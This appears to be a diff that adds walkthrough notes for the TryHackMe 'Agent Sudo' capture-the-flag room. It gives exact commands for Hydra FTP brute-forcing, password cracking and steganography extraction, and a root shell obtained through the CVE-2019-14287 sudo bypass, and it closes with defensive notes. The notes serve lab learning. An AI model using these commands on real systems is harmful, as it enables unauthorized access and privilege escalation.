@@ -1,0 +1,123 @@
+Author: Royalian28
+Last Updated: 2025-10-03
+
+Scope: High-fidelity walkthrough notes for the `Agent Sudo` room. Contains the exact commands used during enumeration, exploitation, and privilege escalation. Use **only** in authorized lab environments (TryHackMe sandbox). Do **not** target production or systems you do not own.
+
+
+Target / OS
+
+Linux (CTF-style)
+
+Objective
+
+Obtain `user` and `root` flags via enumeration, artifact extraction, and privilege escalation.
+
+
+Enumeration
+
+Run a full service/version scan against the target IP:
+
+bash
+nmap $IP -sV -Pn
+
+
+Notes: discover services and versions (identify web server, FTP, SSH, etc.).
+
+
+User Enumeration & Brute-force (FTP)
+
+1. Change `User-Agent` to reveal hidden content on the web application (use a UA switcher to set to the indicated codename).
+2. Brute-force FTP credentials for user `chris` with Hydra:
+
+bash
+hydra -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp
+
+
+3. Use the recovered FTP credentials to login and download files from the FTP server.
+
+
+
+Embedded ZIP / Stego Extraction
+
+1. If an image contains an embedded ZIP, extract it with `binwalk` (or similar extraction technique supported by your local toolset).
+
+2. If the ZIP is password protected, convert it to John format and crack it:
+
+bash
+zip2john 8702.zip > hash.txt
+john hash.txt
+
+
+3. Extract the archive after cracking the password:
+
+bash
+7z e 8702.zip
+
+
+4. If you encounter base64-encoded strings, decode them:
+
+bash
+echo 'QXJlYTUx' | base64 -d
+
+
+5. For steganographed images, extract with `steghide` (when prompted, supply the discovered password):
+
+bash
+steghide --extract -sf cute-alien.jpg
+
+
+SSH / User Foothold
+
+1. Use discovered credentials to SSH into the box as the user (example):
+
+bash
+ssh james@$IP
+
+
+2. Copy any interesting files out (example):
+
+bash
+scp james@$IP:/home/james/Alien_autospy.jpg .
+
+
+
+
+Privilege Escalation (sudo backdoor)
+
+1. Check `sudo` version and identify if vulnerable to CVE-2019-14287.
+
+2. Exploit the sudo UID bypass to spawn a root shell:
+
+bash
+sudo -u#-1 /bin/bash
+
+
+3. If the shell has EUID 0 but UID is still the original user, set the UID to 0 to fully become root:
+
+bash
+python -c "import os;os.setuid(0);os.system('bash -p')"
+
+
+
+
+Post-Exploitation
+
+* After escalation, locate and read the user and root flags (e.g., `/home/<user>/user.txt` and `/root/root.txt`).
+* Record findings for your report.
+
+
+Cleanup
+
+* Exit shells and remove any local copies of artifacts you do not need.
+* Do not leave tools, credentials, or exploit scripts on the target.
+
+
+Defensive Notes
+
+* Do not rely on weak header-based access controls (e.g., `User-Agent`) for sensitive functionality.
+* Patch sudo and avoid configurations that allow Runas ALL sudoers to bypass policy checks.
+* Monitor unusual `sudo` invocations and unexpected UID/EUID transitions.
+
+Attribution
+
+This walkthrough was adapted from an existing walkthrough published on Medium (David Eduardo Karpinski). Use these notes only for learning in authorized environments.
